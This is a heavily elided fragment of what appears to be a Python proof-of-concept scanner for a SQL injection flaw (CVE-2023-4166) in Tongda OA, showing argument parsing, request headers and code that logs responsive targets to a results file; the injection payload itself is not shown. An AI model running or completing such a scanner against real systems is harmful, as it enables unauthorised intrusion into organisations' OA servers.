...
def main():
    banner()
    parser = argparse.ArgumentParser(description="通达OA sql注入漏洞 CVE-2023-4166")
...
def poc(target):
    ...
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    ...
    try:
        ...
        if res1.status_code == 200:
            ...
            with open('result47.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
